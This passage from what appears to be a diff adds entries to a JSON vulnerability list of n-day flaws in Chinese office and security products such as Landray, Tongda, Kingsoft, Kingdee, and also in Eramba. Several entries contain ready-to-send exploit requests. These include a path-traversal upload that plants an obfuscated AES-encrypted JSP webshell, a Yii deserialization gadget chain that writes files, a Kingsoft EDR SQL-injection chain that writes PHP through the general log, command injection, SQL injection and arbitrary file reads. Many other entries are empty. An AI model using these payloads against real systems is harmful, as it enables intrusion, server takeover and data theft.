+  "poc": "POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: zh-CN,zh;q=0.9 Content-type: Content-Length: 2444 DBSTEP V3.0 141 0 5860 DBSTEP=REJTVEVQ OPTION=U0FWRUFTSFRNTA== HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL2RlbW9kZW1vLnR4dA== RECORDID= DIRECTORY= 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 例如 冰蝎3 密码1的请求体 DBSTEP V3.0 121 0 1924 DBSTEP=REJTVEVQ OPTION=U0FWRUFTSFRNTA== HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL2RlbW9kZW1vNi5qc3A= DIRECTORY= <%! public byte[] A9wY2(String Strings,String k) throws Exception { javax.crypto.Cipher B437D3 = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");B437D3.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), \"AES\"));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = \"\";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);bytes = (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = \"\";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), Strings);}byte[] result = (byte[]) B437D3.getClass()./*Z91g8897x1*/getDeclaredMethod/*Z91g8897x1*/(\"doFinal\", new Class[]{byte[].class}).invoke(B437D3,new Object[]{bytes});return result;} %><% try { String KAW33b6 = \"c4ca4238a0b92382\"; session.putValue(\"u\", KAW33b6); byte[] In2OHi0 = A9wY2 (request.getReader().readLine(),KAW33b6); java./*Z91g8897x1*/lang./*Z91g8897x1*/reflect.Method A9wY2 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod/*Z91g8897x1*/(\"defineClass\",byte[].class,int/**/.class,int/**/.class); A9wY2.setAccessible(true); Class i = (Class)A9wY2.invoke(Thread.currentThread()./*Z91g8897x1*/getContextClassLoader(), In2OHi0 , 0, In2OHi0.length); Object QEzw = i./*Z91g8897x1*/newInstance(); QEzw.equals(pageContext); } catch (Exception e) {} %>",
+  "label": "nday"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "蓝凌OA存在未授权获取sso key到rce",
+  "type": "信息泄露、RCE",
+  "source": "DVB、TG",
+  "info": "",
+  "date": "08.08",
+  "poc": "Name: 深圳市蓝凌软件股份有限公司-EKP系统-存在未授权访问漏洞 Description: 蓝凌EKP由深圳市蓝凌软件股份有限公司自出研发，是一款全程在线数字化OA，应用于大中型企业在线化办公。 包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等100个功能模块。。攻击者可利用漏洞获取大量敏感信息。 Identifier: DVB: DVB-2023-4863 VulnClass: - 信息泄漏 Category: - 应用服务 Manufacturer: 蓝凌 Product: EKP Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2023-07-11' Is0day: true IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"蓝凌云服务平台\"||(body=\"Landray\"&&body=\"登录系统\")||body=\"/scripts/jquery.landray.common.js\"||body=\"java.landray.com.cn\"||body=\"蓝凌软件\" ||(body=\"StylePath\" && body=\"encryptPassword\") Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /./ui-ext/./behavior/ headers: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.850.132 Safari/537.36 follow_redirects: false matches: (code.eq(\"200\") && body.contains(\"ekp_server.log\"))",
+  "label": "nday"
+ },
+ {
+  "vendor": "通达",
+  "name": "通达OA v11.6 report_bi.func.php SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "通达",
+  "name": "通达OA v11.9 前台SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "GET /general/attendance/manage/ask_duty/delete.php?ASK_DUTY_ID=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and%20(1)=(1 HTTP/1.1 Host: 192.168.90.109 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=35iu6kboi7l3ce2tik9cdt9ei2; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=9886a78f Connection: close",
+  "label": "nday"
+ },
+ {
+  "vendor": "通达",
+  "name": "通达oa11.10 未授权任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "通达",
+  "name": "通达OA前台反序列化漏洞",
+  "type": "反序列化",
+  "source": "DVB、微信",
+  "info": "",
+  "date": "08.08",
+  "poc": "Name: 通达OA前台反序列化漏洞 Description: 通达OA是由北京通达信科科技有限公司研发的一款通用型OA产品，涵盖了个人事务、行政办公、流程审批、知识管理、人力资源管理、组织机构管理等企业信息化管理功能。该应用使用的yii框架存在反序列化漏洞，攻击者可以利用该漏洞上传恶意文件，获取服务器权限。 Identifier: DVB: DVB-2023-4705 VulnClass: - 反序列化漏洞 - 任意文件上传 Category: - 应用服务 Manufacturer: 通达信科 Product: 通达OA Type: 1 Status: 1 Scanable: 1 Level: 4 DisclosureDate: '2023-07-10' Is0day: true IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"javascript:document.form1.UNAME.focus()\"|| (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2017\"|| body=\"url:'/general/login_code_check.php'\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 && req1 session: false requests: - method: POST timeout: 10 path: /general/appbuilder/web/portal/gateway/? headers: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2387.92 Safari/537.36 Cookie: _GET=f8e5e60742c33b6493815f3e763b0491269e30bb3cb1ff546986c609f99b207aO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A8%3A%7Bs%3A2%3A%22db%22%3BN%3Bs%3A5%3A%22query%22%3BN%3Bs%3A9%3A%22batchSize%22%3Bi%3A100%3Bs%3A4%3A%22each%22%3Bb%3A0%3Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A4%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A11%3A%7Bs%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A135%3Bs%3A10%3A%22unixSocket%22%3BN%3Bs%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A17%3A%22connectionTimeout%22%3BN%3Bs%3A11%3A%22dataTimeout%22%3BN%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22assert%22%3Bs%3A2%3A%22id%22%3Bs%3A1366%3A%22file_put_contents%28td_authcode%28%27c9066idpU3LapxFv%2FEIOat11FnExsaNDHYRI6apb32BdYN5n9ldjc%2Fc3dKcWJp4%27%2C%27DECODE%27%2C+%271234567890%27%2C+%27%27%29%2Ctd_authcode%28%27c0f8F3SdvZ29CaBP0cEreJINtwOEVNH0t%2Fj3awvryrmDvBOiH7ECj%2F3KEHHAQtzdXWKSaC17FWbCDJVBRpBNwZiWAC63ACHX5oG5US5ZSK1ky%2B%2Fyi9Ua4EgZmJ%2F2nYryZwfUGhGyUArCtx1tOcIStL0krmsydoveWwhBy%2B289ra3DpuKi1M%2BotTgp60GTeIkKH9ZdzMSOyjdhXNIQv38jgtmIiwkI1CxxdjMDyowDoOwwl3iFd4IOFzJhrU9MLl907cu6GnC7dM9SC5bf4Knp0vwilfoE3QFACzu%2FJs16YEQpPdNxC%2BNOT867Z1P74g7sP6wxW5glkDXSm5s%2BVvUhw5gfsNGNotql%2BnzpTGoSTPAppBaN0htU1Ka3L5F0OztWt9KUFpvSfdnEETeb01eCMUfOvXAEIK43ptSNGUVTw4SgrqE0NFOZlmldmDABy%2FiZSxa%2B0uabNcI9Q7TGMzsGj0Rp6Y2zaxErgiX6N4mMG4jXMZkMmNvPvhdR63m8O8d1I6gsb6Lrdk62XcgDN3I%2FXaoZJIh5RhFMhWdb%2FiAKmw%2BWL21MEs7Ip8Hu0j1br9R0ePLAMUeLphXpdBV5Fm5AiNn%2BBK6Ornu%2FFFrAwV6R1oyu1E%2Fef52I8KCtPvCapAVQrHlxjV0b957hNCjwIEqpRyi1Se5IapaQidERhACAoAob5gCr7bspSmrGxGczRjpwGpuyNmB%2Bw55MUsKKmeFOWPOZCGXDIqUyzZU47ZcZyjmptlAiq%2B4ZsXuPZYU9nH7eysgAGBj2hjJC7OR0U3Td54JZUteT8IP4AYZwxEW0oZfld4Fr7MUFtIib5mqSaDJRWNOc1YIkDxdXtFntGtnL7qLlzBdIT6xRbCXquuQW3YBnlWdg5NWjyyy1NHCwjHkHCaUYnyR%2BWE2mOj4HkZtS0uBq%2BYl4Pb2M9Qz8unJVRV5ySn5GBRAZNOkF%2FWroNOdxvQsrWMGjVm8WFr0xc24tkd6urs8AeWDg%2B912%2FakS20r8Djhel78fScggK%2FIAAb9kL5a67tM8BC49ezQ36f7QS4hyoT4%2FEqYBo5AGCHHB%2FbqwMN%2F3H9W2cOK0XmN2m3rfebP5LyTrSWZeR9VMGaJXfcqxk0gypz%2BoCfc94U%2Ff4hqchQSYSBS50JR0R1Q8JxXv4zY6rwr5T4BiTg6VTLIDa12RJtW6zCWELll6eDxFb3xcko%27%2C%27DECODE%27%2C+%271234567890%27%2C+%27%27%29%29%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D%7D%7Ds%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3B%7Ds%3A26%3A%22%00yii%5Cdb%5CDataReader%00_closed%22%3Bb%3A0%3Bs%3A23%3A%22%00yii%5Cdb%5CDataReader%00_row%22%3BN%3Bs%3A25%3A%22%00yii%5Cdb%5CDataReader%00_index%22%3Bi%3A-1%3B%7Ds%3A31%3A%22%00yii%5Cdb%5CBatchQueryResult%00_batch%22%3BN%3Bs%3A31%3A%22%00yii%5Cdb%5CBatchQueryResult%00_value%22%3BN%3Bs%3A29%3A%22%00yii%5Cdb%5CBatchQueryResult%00_key%22%3BN%3B%7D Content-Type: application/x-www-form-urlencoded follow_redirects: true matches: code.eq(\"500\") - method: GET timeout: 10 path: /logon.php headers: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.1706.93 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") && body.leneq(\"0\"))",
+  "label": "nday"
+ },
+ {
+  "vendor": "金和",
+  "name": "金和OA-C6-getTreeDate-SQL注入",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "金和",
+  "name": "金和OA CheckPwd.ashx SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "金和",
+  "name": "金和OA LoginServices.asmx 任意密码重置",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "金和",
+  "name": "金和OA_C6-UploadFileEditoraspx-SQL注入",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "金山",
+  "name": "金山VGM防毒墙downFile.php 任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "金山",
+  "name": "金山终端安全系统edr V9 RCE",
+  "type": "RCE",
+  "source": "DVB、TG",
+  "info": "",
+  "date": "08.08",
+  "poc": "开启⽇志 /Console/inter/handler/change_white_list_cmd.php id参数 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 131 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&m2=0 {\"change_white_list_cmd\":{\"ip\":\"{BD435CCE-3F91EC}\",\"name\":\"3AF264D9- AE5A\",\"id\":\"111;set/**/global/**/general_log=on;\",\"type\":\"0\"}} 设置日志php文件 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 Content-Length: 195 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.24.3:6868 Referer: http://192.168.24.3:6868/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7 Connection: close {\"change_white_list_cmd\":{\"ip\":\"{BD435CCE-3F91EC}\",\"name\":\"3AF264D9- AE5A\",\"id\":\"111;set/**/global/**/general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656 36b5f6c6f67696e322e706870;\",\"type\":\"0\"}} 写入php代码 POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1 Host: 192.168.24.3:6868 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 222 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/index.php {\"settings_distribute_cmd\":{\"userSession\":\"{BD435CCE-3F91-E1AA-3844- 76A49EE862EB}\",\"mode_id\":\"3AF264D9-AE5A-86F0-6882-DD7F56827017\",\"settings\":\"3AF264D9- AE5A-86F0-6882-DD7F56827017_0\",\"SC_list\":{\"a\":\"<?php phpinfo();?>\"}}} 最后get请求rce： http://192.168.24.3:6868/check_login2.php 开启⽇志 设置⽇志php⽂件 写⼊php代码 /Console/inter/handler/change_white_list_cmd.php id参数 POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 131 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&m2=0 {\"change_white_list_cmd\":{\"ip\":\"{BD435CCE-3F91EC}\",\"name\":\"3AF264D9- AE5A\",\"id\":\"111;set/**/global/**/general_log=on;\",\"type\":\"0\"}} POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1 Host: 192.168.24.3:6868 Content-Length: 195 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.24.3:6868 Referer: http://192.168.24.3:6868/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7 Connection: close {\"change_white_list_cmd\":{\"ip\":\"{BD435CCE-3F91EC}\",\"name\":\"3AF264D9- AE5A\",\"id\":\"111;set/**/global/**/general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656 36b5f6c6f67696e322e706870;\",\"type\":\"0\"}} POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1 Host: 192.168.24.3:6868 RCE User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 222 Origin: http://192.168.24.3:6868 Connection: close Referer: http://192.168.24.3:6868/index.php {\"settings_distribute_cmd\":{\"userSession\":\"{BD435CCE-3F91-E1AA-3844- 76A49EE862EB}\",\"mode_id\":\"3AF264D9-AE5A-86F0-6882-DD7F56827017\",\"settings\":\"3AF264D9- AE5A-86F0-6882-DD7F56827017_0\",\"SC_list\":{\"a\":\"<?php phpinfo();?>\"}}} http://192.168.24.3:6868/check_login2.php",
+  "label": "nday"
+ },
+ {
+  "vendor": "金山",
+  "name": "金山终端安全系统V9 SQLI",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "金蝶",
+  "name": "金蝶云星空BBC系统目录遍历",
+  "type": "目录目录遍历",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "金蝶",
+  "name": "金蝶云星空CommonFileServer任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "DVB、TG",
+  "info": "DVB-2023-4806",
+  "date": "08.08",
+  "poc": "GET /CommonFileServer/c:/windows/win.ini",
+  "label": "nday"
+ },
+ {
+  "vendor": "金蝶",
+  "name": "金蝶云星空远程命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "鼎成科技",
+  "name": "SECCN G20 VPN防火墙后台命令注入",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "Eramba",
+  "name": "Eramba任意代码执行漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "Enterprise and Community edition <= 3.19.1",
+  "date": "",
+  "poc": "GET /settings/download-test-pdf?path=ip%20a; HTTP/1.1 Host: [redacted] Cookie: translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: de,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: https://[redacted]/settings Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close",
+  "label": "nday"
+ }
+]
